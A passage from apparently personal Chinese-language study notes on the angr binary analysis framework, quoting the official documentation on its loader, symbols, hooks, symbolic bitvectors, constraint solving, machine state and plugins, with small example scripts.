 proj.analyses.reload_analyses		proj.analyses.BinaryOptimizer      
 proj.analyses.DDG                  proj.analyses.StaticHooker
 proj.analyses.BinDiff              proj.analyses.DFG                  
 proj.analyses.VariableRecovery		proj.analyses.BoyScout             
 proj.analyses.Disassembly          proj.analyses.VariableRecoveryFast
 proj.analyses.CDG                  proj.analyses.GirlScout            
 proj.analyses.Veritesting			proj.analyses.CFG                  
 proj.analyses.Identifier           proj.analyses.VFG
 proj.analyses.CFGEmulated          proj.analyses.LoopFinder           
 proj.analyses.VSA_DDG				proj.analyses.CFGFast              
 proj.analyses.Reassembler
</code></pre>
<p>（未必准确的解释，后续慢慢验证）</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231024094301794-16981317832354.png" alt="image-20231024094301794"></p>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False) # 不加载所有依赖的外部动态链接库，防止出现额外开销以及库不兼容的报错等等问题
cfg = proj.analyses.CFGFast()
print(cfg)
print(&#39;----&#39;)
print(cfg.graph.nodes())
entry_node = cfg.get_any_node(proj.entry)
print(&#39;----&#39;)
print(entry_node)
</code></pre>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231024095601415-16981317771273.png" alt="image-20231024095601415"></p>
<h4 id="The-Loader"><a href="#The-Loader" class="headerlink" title="The Loader"></a>The Loader</h4><pre><code class="python"># All loaded objects
&gt;&gt;&gt; proj.loader.all_objects
[&lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;,
 &lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]&gt;,
 &lt;ELF Object ld-2.23.so, maps [0x2000000:0x2227167]&gt;,
 &lt;ELFTLSObject Object cle##tls, maps [0x3000000:0x3015010]&gt;,
 &lt;ExternObject Object cle##externs, maps [0x4000000:0x4008000]&gt;,
 &lt;KernelObject Object cle##kernel, maps [0x5000000:0x5008000]&gt;]

# This is the &quot;main&quot; object, the one that you directly specified when loading the project
&gt;&gt;&gt; proj.loader.main_object
&lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;

# This is a dictionary mapping from shared object name to object
&gt;&gt;&gt; proj.loader.shared_objects
&#123; &#39;fauxware&#39;: &lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;,
  &#39;libc.so.6&#39;: &lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]&gt;,
  &#39;ld-linux-x86-64.so.2&#39;: &lt;ELF Object ld-2.23.so, maps [0x2000000:0x2227167]&gt; &#125;

# Here&#39;s all the objects that were loaded from ELF files
# If this were a windows program we&#39;d use all_pe_objects!
&gt;&gt;&gt; proj.loader.all_elf_objects
[&lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;,
 &lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]&gt;,
 &lt;ELF Object ld-2.23.so, maps [0x2000000:0x2227167]&gt;]

# Here&#39;s the &quot;externs object&quot;, which we use to provide addresses for unresolved imports and angr internals
&gt;&gt;&gt; proj.loader.extern_object
&lt;ExternObject Object cle##externs, maps [0x4000000:0x4008000]&gt;

# This object is used to provide addresses for emulated syscalls
&gt;&gt;&gt; proj.loader.kernel_object
&lt;KernelObject Object cle##kernel, maps [0x5000000:0x5008000]&gt;

# Finally, you can to get a reference to an object given an address in it
&gt;&gt;&gt; proj.loader.find_object_containing(0x400000)
&lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;
</code></pre>
<pre><code class="python">&gt;&gt;&gt; obj = proj.loader.main_object

# The entry point of the object
&gt;&gt;&gt; obj.entry
0x400580

&gt;&gt;&gt; obj.min_addr, obj.max_addr
(0x400000, 0x60105f)

# Retrieve this ELF&#39;s segments and sections
&gt;&gt;&gt; obj.segments
&lt;Regions: [&lt;ELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0&gt;,
           &lt;ELFSegment memsize=0x238, filesize=0x228, vaddr=0x600e28, flags=0x6, offset=0xe28&gt;]&gt;
&gt;&gt;&gt; obj.sections
&lt;Regions: [&lt;Unnamed | offset 0x0, vaddr 0x0, size 0x0&gt;,
           &lt;.interp | offset 0x238, vaddr 0x400238, size 0x1c&gt;,
           &lt;.note.ABI-tag | offset 0x254, vaddr 0x400254, size 0x20&gt;,
            ...etc

# You can get an individual segment or section by an address it contains:
&gt;&gt;&gt; obj.find_segment_containing(obj.entry)
&lt;ELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0&gt;
&gt;&gt;&gt; obj.find_section_containing(obj.entry)
&lt;.text | offset 0x580, vaddr 0x400580, size 0x338&gt;

# Get the address of the PLT stub for a symbol
&gt;&gt;&gt; addr = obj.plt[&#39;strcmp&#39;]
&gt;&gt;&gt; addr
0x400550
&gt;&gt;&gt; obj.reverse_plt[addr]
&#39;strcmp&#39;

# Show the prelinked base of the object and the location it was actually mapped into memory by CLE
&gt;&gt;&gt; obj.linked_base
0x400000
&gt;&gt;&gt; obj.mapped_base
0x400000
</code></pre>
<h4 id="Symbols-and-Relocations"><a href="#Symbols-and-Relocations" class="headerlink" title="Symbols and Relocations"></a>Symbols and Relocations</h4><p>CLE寻找符号地址</p>
<pre><code class="python">&gt;&gt;&gt; strcmp = proj.loader.find_symbol(&#39;strcmp&#39;)
&gt;&gt;&gt; strcmp
&lt;Symbol &quot;strcmp&quot; in libc.so.6 at 0x1089cd0&gt;
</code></pre>
<p>The Symbol object has three ways of reporting its address:</p>
<ul>
<li><code>.rebased_addr</code> is its address in the global address space. This is what is shown in the print output.</li>
<li><code>.linked_addr</code> is its address relative to the prelinked base of the binary. This is the address reported in, for example, <code>readelf(1)</code>.</li>
<li><code>.relative_addr</code> is its address relative to the object base. This is known in the literature (particularly the Windows literature) as an RVA (relative virtual address).</li>
</ul>
<pre><code class="python">&gt;&gt;&gt; strcmp.name
&#39;strcmp&#39;

&gt;&gt;&gt; strcmp.owner
&lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]&gt;

&gt;&gt;&gt; strcmp.rebased_addr # 进程虚拟内存中的地址
0x1089cd0
&gt;&gt;&gt; strcmp.linked_addr #链接时分配的地址
0x89cd0
&gt;&gt;&gt; strcmp.relative_addr # 被加载到的预定基地址
0x89cd0
</code></pre>
<pre><code class="python">&gt;&gt;&gt; strcmp.is_export
True
&gt;&gt;&gt; strcmp.is_import
False

# On Loader, the method is find_symbol because it performs a search operation to find the symbol.
# On an individual object, the method is get_symbol because there can only be one symbol with a given name.
&gt;&gt;&gt; main_strcmp = proj.loader.main_object.get_symbol(&#39;strcmp&#39;)
&gt;&gt;&gt; main_strcmp
&lt;Symbol &quot;strcmp&quot; in fauxware (import)&gt;
&gt;&gt;&gt; main_strcmp.is_export
False
&gt;&gt;&gt; main_strcmp.is_import
True
&gt;&gt;&gt; main_strcmp.resolvedby
&lt;Symbol &quot;strcmp&quot; in libc.so.6 at 0x1089cd0&gt;
</code></pre>
<pre><code class="python"># Relocations don&#39;t have a good pretty-printing, so those addresses are Python-internal, unrelated to our program
&gt;&gt;&gt; proj.loader.shared_objects[&#39;libc.so.6&#39;].imports
&#123;&#39;__libc_enable_secure&#39;: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce780&gt;,
 &#39;__tls_get_addr&#39;: &lt;cle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018358&gt;,
 &#39;_dl_argv&#39;: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2e48&gt;,
 &#39;_dl_find_dso_for_object&#39;: &lt;cle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018588&gt;,
 &#39;_dl_starting_up&#39;: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2550&gt;,
 &#39;_rtld_global&#39;: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce4e0&gt;,
 &#39;_rtld_global_ro&#39;: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fcea20&gt;&#125;
</code></pre>
<h4 id="Loading-Options"><a href="#Loading-Options" class="headerlink" title="Loading Options"></a>Loading Options</h4><p>If you are loading something with <code>angr.Project</code> and you want to pass an option to the <code>cle.Loader</code> instance that Project implicitly creates, you can just pass the keyword argument directly to the Project constructor, and it will be passed on to CLE. You should look at the <a href="https://docs.angr.io/projects/cle/en/latest/api.html">CLE API docs.</a> if you want to know everything that could possibly be passed in as an option, but we will go over some important and frequently used options here.</p>
<p>We’ve discussed <code>auto_load_libs</code> already - it enables or disables CLE’s attempt to automatically resolve shared library dependencies, and is on by default. Additionally, there is the opposite, <code>except_missing_libs</code>, which, if set to true, will cause an exception to be thrown whenever a binary has a shared library dependency that cannot be resolved.</p>
<p>You can pass a list of strings to <code>force_load_libs</code> and anything listed will be treated as an unresolved shared library dependency right out of the gate, or you can pass a list of strings to <code>skip_libs</code> to prevent any library of that name from being resolved as a dependency. Additionally, you can pass a list of strings (or a single string) to <code>ld_path</code>, which will be used as an additional search path for shared libraries, before any of the defaults: the same directory as the loaded program, the current working directory, and your system libraries.</p>
<p>If you want to specify some options that only apply to a specific binary object, CLE will let you do that too. The parameters <code>main_opts</code> and <code>lib_opts</code> do this by taking dictionaries of options. <code>main_opts</code> is a mapping from option names to option values, while <code>lib_opts</code> is a mapping from library name to dictionaries mapping option names to option values.</p>
<p>The options that you can use vary from backend to backend, but some common ones are:</p>
<ul>
<li><code>backend</code> - which backend to use, as either a class or a name</li>
<li><code>base_addr</code> - a base address to use</li>
<li><code>entry_point</code> - an entry point to use</li>
<li><code>arch</code> - the name of an architecture to use</li>
</ul>
<p>Example:</p>
<pre><code class="python">&gt;&gt;&gt; angr.Project(&#39;examples/fauxware/fauxware&#39;, main_opts=&#123;&#39;backend&#39;: &#39;blob&#39;, &#39;arch&#39;: &#39;i386&#39;&#125;, lib_opts=&#123;&#39;libc.so.6&#39;: &#123;&#39;backend&#39;: &#39;elf&#39;&#125;&#125;)
&lt;Project examples/fauxware/fauxware&gt;
</code></pre>
<h4 id="Symbolic-Function-Summaries"><a href="#Symbolic-Function-Summaries" class="headerlink" title="Symbolic Function Summaries"></a>Symbolic Function Summaries</h4><p><a href="https://github.com/angr/angr/tree/master/angr/procedures">angr&#x2F;angr&#x2F;procedures at master · angr&#x2F;angr (github.com)</a></p>
<h4 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h4><pre><code class="wiki">The mechanism by which angr replaces library code with a Python summary is called hooking, and you can do it too! When performing simulation, at every step angr checks if the current address has been hooked, and if so, runs the hook instead of the binary code at that address. The API to let you do this is proj.hook(addr, hook), where hook is a SimProcedure instance. You can manage your project’s hooks with .is_hooked, .unhook, and .hooked_by, which should hopefully not require explanation.

There is an alternate API for hooking an address that lets you specify your own off-the-cuff function to use as a hook, by using proj.hook(addr) as a function decorator. If you do this, you can also optionally specify a length keyword argument to make execution jump some number of bytes forward after your hook finishes.
</code></pre>
<pre><code class="python">stub_func = angr.SIM_PROCEDURES[&#39;stubs&#39;][&#39;ReturnUnconstrained&#39;] # this is a CLASS
&gt;&gt;&gt; proj.hook(0x10000, stub_func())  # hook with an instance of the class

&gt;&gt;&gt; proj.is_hooked(0x10000)            # these functions should be pretty self-explanitory
True
&gt;&gt;&gt; proj.hooked_by(0x10000)
&lt;ReturnUnconstrained&gt;
&gt;&gt;&gt; proj.unhook(0x10000)

&gt;&gt;&gt; @proj.hook(0x20000, length=5)
... def my_hook(state):
...     state.regs.rax = 1

&gt;&gt;&gt; proj.is_hooked(0x20000)
True
</code></pre>
<p>可以尝试</p>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False)
state = proj.factory.entry_state()


@proj.hook(proj.entry)
def my_hook(state):
    print(&#39;startttttttt!!!!!!!!&#39;)

simgr = proj.factory.simulation_manager(state)
simgr.run()

# startttttttt!!!!!!!!
</code></pre>
<p>然后可以进行hook修改寄存器等操作</p>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
print(simgr.active[0].regs.eax)

@proj.hook(proj.entry)
def my_hook(state):
    print(&#39;startttttttt!!!!!!!!&#39;)
    simgr.active[0].regs.eax = state.solver.BVV(0x1111, 32)
    print(simgr.active[0].regs.eax)
    
simgr.run()

&quot;&quot;&quot;
&lt;BV32 0x1c&gt;
startttttttt!!!!!!!!
&lt;BV32 0x1111&gt;
&quot;&quot;&quot;
</code></pre>
<h3 id="符号样例"><a href="#符号样例" class="headerlink" title="符号样例"></a>符号样例</h3><h4 id="Bitvectors"><a href="#Bitvectors" class="headerlink" title="Bitvectors"></a>Bitvectors</h4><pre><code class="python">&gt;&gt;&gt; one = state.solver.BVV(1, 64)
&gt;&gt;&gt; one
 &lt;BV64 0x1&gt;
# Create a bitvector symbol named &quot;x&quot; of length 64 bits
&gt;&gt;&gt; x = state.solver.BVS(&quot;x&quot;, 64)
&gt;&gt;&gt; x
&lt;BV64 x_9_64&gt;
&gt;&gt;&gt; y = state.solver.BVS(&quot;y&quot;, 64)
&gt;&gt;&gt; y
&lt;BV64 y_10_64&gt;

&gt;&gt;&gt; x + one
&lt;BV64 x_9_64 + 0x1&gt;
&gt;&gt;&gt; (x + one) / 2
&lt;BV64 (x_9_64 + 0x1) / 0x2&gt;
&gt;&gt;&gt; x - y
&lt;BV64 x_9_64 - y_10_64&gt;
</code></pre>
<p>可以通过ASTs分析</p>
<pre><code class="python">&gt;&gt;&gt; tree = (x + 1) / (y + 2)
&gt;&gt;&gt; tree
&lt;BV64 (x_9_64 + 0x1) / (y_10_64 + 0x2)&gt;
&gt;&gt;&gt; tree.op
&#39;__floordiv__&#39;
&gt;&gt;&gt; tree.args
(&lt;BV64 x_9_64 + 0x1&gt;, &lt;BV64 y_10_64 + 0x2&gt;)
&gt;&gt;&gt; tree.args[0].op
&#39;__add__&#39;
&gt;&gt;&gt; tree.args[0].args
(&lt;BV64 x_9_64&gt;, &lt;BV64 0x1&gt;)
&gt;&gt;&gt; tree.args[0].args[1].op
&#39;BVV&#39;
&gt;&gt;&gt; tree.args[0].args[1].args
(1, 64)
</code></pre>
<h4 id="Symbolic-Constraints"><a href="#Symbolic-Constraints" class="headerlink" title="Symbolic Constraints"></a>Symbolic Constraints</h4><p>Performing comparison operations between any two similarly-typed ASTs will yield another AST - not a bitvector, but now a symbolic boolean.</p>
<pre><code class="python">&gt;&gt;&gt; x == 1
&lt;Bool x_9_64 == 0x1&gt;
&gt;&gt;&gt; x == one
&lt;Bool x_9_64 == 0x1&gt;
&gt;&gt;&gt; x &gt; 2
&lt;Bool x_9_64 &gt; 0x2&gt;
&gt;&gt;&gt; x + y == one_hundred + 5
&lt;Bool (x_9_64 + y_10_64) == 0x69&gt;
&gt;&gt;&gt; one_hundred &gt; 5
&lt;Bool True&gt;
&gt;&gt;&gt; one_hundred &gt; -5 # One tidbit you can see from this is that the comparisons are unsigned by default. The -5 in the last example is coerced to &lt;BV64 0xfffffffffffffffb&gt;, which is definitely not less than one hundred. 
# signed : one_hundred.SGT(-5)
&lt;Bool False&gt;
</code></pre>
<p>判断</p>
<pre><code class="python">yes = one == 1
no = one == 2
maybe = x == y
state.solver.is_true(yes)
True
state.solver.is_false(yes)
False
state.solver.is_true(no)
False
state.solver.is_false(no)
True
state.solver.is_true(maybe)
False
state.solver.is_false(maybe)
False
</code></pre>
<h4 id="Constraint-Solving"><a href="#Constraint-Solving" class="headerlink" title="Constraint Solving"></a>Constraint Solving</h4><pre><code class="python">&gt;&gt;&gt; state.solver.add(x &gt; y)
&gt;&gt;&gt; state.solver.add(y &gt; 2)
&gt;&gt;&gt; state.solver.add(10 &gt; x)
&gt;&gt;&gt; state.solver.eval(x)
4 # result might vary
</code></pre>
<pre><code class="python"># get a fresh state without constraints
&gt;&gt;&gt; state = proj.factory.entry_state()
&gt;&gt;&gt; input = state.solver.BVS(&#39;input&#39;, 64)
&gt;&gt;&gt; operation = (((input + 4) * 3) &gt;&gt; 1) + input
&gt;&gt;&gt; output = 200
&gt;&gt;&gt; state.solver.add(operation == output)
&gt;&gt;&gt; state.solver.eval(input)
0x3333333333333381

&gt;&gt;&gt; state.solver.add(input &lt; 2**32)
&gt;&gt;&gt; state.satisfiable()
False
</code></pre>
<pre><code class="python"># fresh state
&gt;&gt;&gt; state = proj.factory.entry_state()
&gt;&gt;&gt; state.solver.add(x - y &gt;= 4)
&gt;&gt;&gt; state.solver.add(y &gt; 0)
&gt;&gt;&gt; state.solver.eval(x)
5
&gt;&gt;&gt; state.solver.eval(y)
1
&gt;&gt;&gt; state.solver.eval(x + y)
6
</code></pre>
<h4 id="Floating-point-numbers"><a href="#Floating-point-numbers" class="headerlink" title="Floating point numbers"></a>Floating point numbers</h4><pre><code class="python"># fresh state
&gt;&gt;&gt; state = proj.factory.entry_state()
&gt;&gt;&gt; a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE)
&gt;&gt;&gt; a
&lt;FP64 FPV(3.2, DOUBLE)&gt;

&gt;&gt;&gt; b = state.solver.FPS(&#39;b&#39;, state.solver.fp.FSORT_DOUBLE)
&gt;&gt;&gt; b
&lt;FP64 FPS(&#39;FP_b_0_64&#39;, DOUBLE)&gt;

&gt;&gt;&gt; a + b
&lt;FP64 fpAdd(&#39;RNE&#39;, FPV(3.2, DOUBLE), FPS(&#39;FP_b_0_64&#39;, DOUBLE))&gt;

&gt;&gt;&gt; a + 4.4
&lt;FP64 FPV(7.6000000000000005, DOUBLE)&gt;

&gt;&gt;&gt; b + 2 &lt; 0
&lt;Bool fpLT(fpAdd(&#39;RNE&#39;, FPS(&#39;FP_b_0_64&#39;, DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))&gt;
</code></pre>
<p>This is nice, but sometimes we need to be able to work directly with the representation of the float as a bitvector. You can interpret bitvectors as floats and vice versa, with the methods <code>raw_to_bv</code> and <code>raw_to_fp</code>:</p>
<pre><code class="python">&gt;&gt;&gt; a.raw_to_bv()
&lt;BV64 0x400999999999999a&gt;
&gt;&gt;&gt; b.raw_to_bv()
&lt;BV64 fpToIEEEBV(FPS(&#39;FP_b_0_64&#39;, DOUBLE))&gt;

&gt;&gt;&gt; state.solver.BVV(0, 64).raw_to_fp()
&lt;FP64 FPV(0.0, DOUBLE)&gt;
&gt;&gt;&gt; state.solver.BVS(&#39;x&#39;, 64).raw_to_fp()
&lt;FP64 fpToFP(x_1_64, DOUBLE)&gt;
</code></pre>
<pre><code class="python">&gt;&gt;&gt; a
&lt;FP64 FPV(3.2, DOUBLE)&gt;
&gt;&gt;&gt; a.val_to_bv(12)
&lt;BV12 0x3&gt;
&gt;&gt;&gt; a.val_to_bv(12).val_to_fp(state.solver.fp.FSORT_FLOAT)
&lt;FP32 FPV(3.0, FLOAT)&gt;
</code></pre>
<h4 id="More-Solving-Methods"><a href="#More-Solving-Methods" class="headerlink" title="More Solving Methods"></a>More Solving Methods</h4><p><code>eval</code> will give you one possible solution to an expression, but what if you want several? What if you want to ensure that the solution is unique? The solver provides you with several methods for common solving patterns:</p>
<ul>
<li><code>solver.eval(expression)</code> will give you one possible solution to the given expression.</li>
<li><code>solver.eval_one(expression)</code> will give you the solution to the given expression, or throw an error if more than one solution is possible.</li>
<li><code>solver.eval_upto(expression, n)</code> will give you up to n solutions to the given expression, returning fewer than n if fewer than n are possible.</li>
<li><code>solver.eval_atleast(expression, n)</code> will give you n solutions to the given expression, throwing an error if fewer than n are possible.</li>
<li><code>solver.eval_exact(expression, n)</code> will give you n solutions to the given expression, throwing an error if fewer or more than are possible.</li>
<li><code>solver.min(expression)</code> will give you the minimum possible solution to the given expression.</li>
<li><code>solver.max(expression)</code> will give you the maximum possible solution to the given expression.</li>
</ul>
<p>Additionally, all of these methods can take the following keyword arguments:</p>
<ul>
<li><code>extra_constraints</code> can be passed as a tuple of constraints. These constraints will be taken into account for this evaluation, but will not be added to the state.</li>
<li><code>cast_to</code> can be passed a data type to cast the result to. Currently, this can only be <code>int</code> and <code>bytes</code>, which will cause the method to return the corresponding representation of the underlying data. For example, <code>state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=bytes)</code> will return <code>b&#39;ABCD&#39;</code>.</li>
</ul>
<h3 id="Machine-State-memory-registers-and-so-on"><a href="#Machine-State-memory-registers-and-so-on" class="headerlink" title="Machine State - memory, registers, and so on"></a>Machine State - memory, registers, and so on</h3><p>quick examples:</p>
<pre><code class="python">&gt;&gt;&gt; import angr, claripy
&gt;&gt;&gt; proj = angr.Project(&#39;/bin/true&#39;)
&gt;&gt;&gt; state = proj.factory.entry_state()

# copy rsp to rbp
&gt;&gt;&gt; state.regs.rbp = state.regs.rsp

# store rdx to memory at 0x1000
&gt;&gt;&gt; state.mem[0x1000].uint64_t = state.regs.rdx

# dereference rbp
&gt;&gt;&gt; state.regs.rbp = state.mem[state.regs.rbp].uint64_t.resolved

# add rax, qword ptr [rsp + 8]
&gt;&gt;&gt; state.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved
</code></pre>
<p>这里开始使用更简单的执行方法：<code>state.step()</code>，其会进行一步符号执行并且返回名为<a href="https://docs.angr.io/en/latest/api.html#angr.engines.successors.SimSuccessors"><code>angr.engines.successors.SimSuccessors</code></a>的对象，并且会提供若干可以被分类成不同执行路径的继承状态，关注该对象的 <code>.successors</code> 属性，其是一个包含所有“normal” successors of a given step的list。</p>
<p>该list会包含所有constraint的正误状态作为新的constraint</p>
<p>(这里的example应该是用一个strcmp作为constraint)</p>
<pre><code class="python">&gt;&gt;&gt; proj = angr.Project(&#39;examples/fauxware/fauxware&#39;)
&gt;&gt;&gt; state = proj.factory.entry_state(stdin=angr.SimFile)  # ignore that argument for now - we&#39;re disabling a more complicated default setup for the sake of education
&gt;&gt;&gt; while True:
...     succ = state.step()
...     if len(succ.successors) == 2:
...         break
...     state = succ.successors[0]

&gt;&gt;&gt; state1, state2 = succ.successors
&gt;&gt;&gt; state1
&lt;SimState @ 0x400629&gt;
&gt;&gt;&gt; state2
&lt;SimState @ 0x400699&gt;
</code></pre>
<p>可以use <code>state.posix.stdin.load(0, state.posix.stdin.size)</code> to retrieve a bitvector representing all the content read from stdin so far</p>
<pre><code class="python">&gt;&gt;&gt; input_data = state1.posix.stdin.load(0, state1.posix.stdin.size)

&gt;&gt;&gt; state1.solver.eval(input_data, cast_to=bytes)
b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00\x00\x00&#39;

&gt;&gt;&gt; state2.solver.eval(input_data, cast_to=bytes)
b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x00\x80N\x00\x00 \x00\x00\x00\x00&#39;
</code></pre>
<h4 id="State-Presets"><a href="#State-Presets" class="headerlink" title="State Presets"></a>State Presets</h4><p><code>project.factory.</code></p>
<ul>
<li><code>.blank_state()</code> constructs a “blank slate” blank state, with most of its data left uninitialized. When accessing uninitialized data, an unconstrained symbolic value will be returned.</li>
<li><code>.entry_state()</code> constructs a state ready to execute at the main binary’s entry point.</li>
<li><code>.full_init_state()</code> constructs a state that is ready to execute through any initializers that need to be run before the main binary’s entry point, for example, shared library constructors or preinitializers. When it is finished with these it will jump to the entry point.</li>
<li><code>.call_state()</code> constructs a state ready to execute a given function.</li>
</ul>
<p>使用方法：</p>
<ul>
<li>传入起始地址：</li>
</ul>
<p>​	All of these constructors can take an <code>addr</code> argument to specify the exact address to start.</p>
<ul>
<li>传入参数：</li>
</ul>
<p>​	If you’re executing in an environment that can take command line arguments or an environment, you can pass a list of arguments through <code>args</code> and a dictionary of environment variables through <code>env</code> into <code>entry_state</code> and <code>full_init_state</code>. The values in these structures can be strings or bitvectors, and will be serialized into the state as the arguments and environment to the simulated execution. The default <code>args</code> is an empty list, so if the program you’re analyzing expects to find at least an <code>argv[0]</code>, you should always provide that!</p>
<ul>
<li>可以传入符号</li>
</ul>
<p>​	If you’d like to have <code>argc</code> be symbolic, you can pass a symbolic bitvector as <code>argc</code> to the <code>entry_state</code> and <code>full_init_state</code> constructors. Be careful, though: if you do this, you should also add a constraint to the resulting state that your value for argc cannot be larger than the number of args you passed into <code>args</code>.</p>
<ul>
<li>传入函数参数</li>
</ul>
<p>​	To use the call state, you should call it with <code>.call_state(addr, arg1, arg2, ...)</code>, where <code>addr</code> is the address of the function you want to call and <code>argN</code> is the Nth argument to that function, either as a Python integer, string, or array, or a bitvector. If you want to have memory allocated and actually pass in a pointer to an object, you should wrap it in an PointerWrapper, i.e. <code>angr.PointerWrapper(&quot;point to me!&quot;)</code>. The results of this API can be a little unpredictable, but we’re working on it.</p>
<p>  ​	To specify the calling convention used for a function with <code>call_state</code>, you can pass a <a href="https://docs.angr.io/en/latest/api.html#angr.calling_conventions.SimCC"><code>SimCC</code></a> instance as the <code>cc</code> argument.:raw-html-m2r: We try to pick a sane default, but for special cases you will need to help angr out.</p>
<h4 id="对内存操作"><a href="#对内存操作" class="headerlink" title="对内存操作"></a>对内存操作</h4><p>对内存地址批量操作</p>
<pre><code class="python">&gt;&gt;&gt; s = proj.factory.blank_state()
&gt;&gt;&gt; s.memory.store(0x4000, s.solver.BVV(0x0123456789abcdef0123456789abcdef, 128))
&gt;&gt;&gt; s.memory.load(0x4004, 6) # load-size is in bytes
&lt;BV48 0x89abcdef0123&gt;

&gt;&gt;&gt; import archinfo
&gt;&gt;&gt; s.memory.load(0x4000, 4, endness=archinfo.Endness.LE) # 小端序存储
&lt;BV32 0x67452301&gt;
</code></pre>
<h4 id="对寄存器操作"><a href="#对寄存器操作" class="headerlink" title="对寄存器操作"></a>对寄存器操作</h4><p><code>state.registers</code> ： <a href="https://docs.angr.io/en/latest/advanced-topics/ir.html#intermediate-representation">Intermediate Representation - angr documentation</a></p>
<p><a href="https://github.com/angr/archinfo">angr&#x2F;archinfo: Classes with architecture-specific information useful to other projects. (github.com)</a></p>
<h4 id="State-Options"><a href="#State-Options" class="headerlink" title="State Options"></a>State Options</h4><p><a href="https://docs.angr.io/en/latest/appendix/options.html#list-of-state-options">https://docs.angr.io/en/latest/appendix/options.html#list-of-state-options</a></p>
<pre><code class="python"># Example: enable lazy solves, an option that causes state satisfiability to be checked as infrequently as possible.
# This change to the settings will be propagated to all successor states created from this state after this line.
&gt;&gt;&gt; s.options.add(angr.options.LAZY_SOLVES)

# Create a new state with lazy solves enabled
&gt;&gt;&gt; s = proj.factory.entry_state(add_options=&#123;angr.options.LAZY_SOLVES&#125;)

# Create a new state without simplification options enabled
&gt;&gt;&gt; s = proj.factory.entry_state(remove_options=angr.options.simplification)
</code></pre>
<h3 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h3><h4 id="State-Plugins"><a href="#State-Plugins" class="headerlink" title="State Plugins"></a>State Plugins</h4><p><a href="https://docs.angr.io/en/latest/extending-angr/state_plugins.html#state-plugins">implement new kinds of data storage</a></p>
<p>For example, the normal <code>memory</code> plugin simulates a flat memory space, but analyses can choose to enable the “abstract memory” plugin, which uses alternate data types for addresses to simulate free-floating memory mappings independent of address, to provide <code>state.memory</code>. Conversely, plugins can reduce code complexity: <code>state.memory</code> and <code>state.registers</code> are actually two different instances of the same plugin, since the registers are emulated with an address space as well.</p>
<h4 id="The-globals-plugin"><a href="#The-globals-plugin" class="headerlink" title="The globals plugin"></a>The globals plugin</h4><p><code>state.globals</code> is an extremely simple plugin: it implements the interface of a standard Python dict, allowing you to store arbitrary data on a state.</p>
<h4 id="The-history-plugin"><a href="#The-history-plugin" class="headerlink" title="The history plugin"></a>The history plugin</h4><p><code>state.history</code> is a very important plugin storing historical data about the path a state has taken during execution. It is actually a linked list of several history nodes, each one representing a single round of execution—you can traverse this list with <code>state.history.parent.parent</code> etc.</p>
<p>To make it more convenient to work with this structure, the history also provides several efficient iterators over the history of certain values. In general, these values are stored as <code>history.recent_NAME</code> and the iterator over them is just <code>history.NAME</code>. For example, <code>for addr in state.history.bbl_addrs: print hex(addr)</code> will print out a basic block address trace for the binary, while <code>state.history.recent_bbl_addrs</code> is the list of basic blocks executed in the most recent step, <code>state.history.parent.recent_bbl_addrs</code> is the list of basic blocks executed in the previous step, etc. If you ever need to quickly obtain a flat list of these values, you can access <code>.hardcopy</code>, e.g. <code>state.history.bbl_addrs.hardcopy</code>. Keep in mind though, index-based accessing is implemented on the iterators.</p>
<p>Here is a brief listing of some of the values stored in the history:</p>
<ul>
<li><code>history.descriptions</code> is a listing of string descriptions of each of the rounds of execution performed on the state.</li>
<li><code>history.bbl_addrs</code> is a listing of the basic block addresses executed by the state. There may be more than one per round of execution, and not all addresses may correspond to binary code - some may be addresses at which SimProcedures are hooked.</li>
<li><code>history.jumpkinds</code> is a listing of the disposition of each of the control flow transitions in the state’s history, as VEX enum strings.</li>
<li><code>history.jump_guards</code> is a listing of the conditions guarding each of the branches that the state has encountered.</li>
<li><code>history.events</code> is a semantic listing of “interesting events” which happened during execution, such as the presence of a symbolic jump condition, the program popping up a message box, or execution terminating with an exit code.</li>
<li><code>history.actions</code> is usually empty, but if you add the <code>angr.options.refs</code> options to the state, it will be populated with a log of all the memory, register, and temporary value accesses performed by the program.</li>
</ul>
<h4 id="The-callstack-plugin"><a href="#The-callstack-plugin" class="headerlink" title="The callstack plugin"></a>The callstack plugin</h4><p>angr will track the call stack for the emulated program. On every call instruction, a frame will be added to the top of the tracked callstack, and whenever the stack pointer drops below the point where the topmost frame was called, a frame is popped. This allows angr to robustly store data local to the current emulated function.</p>
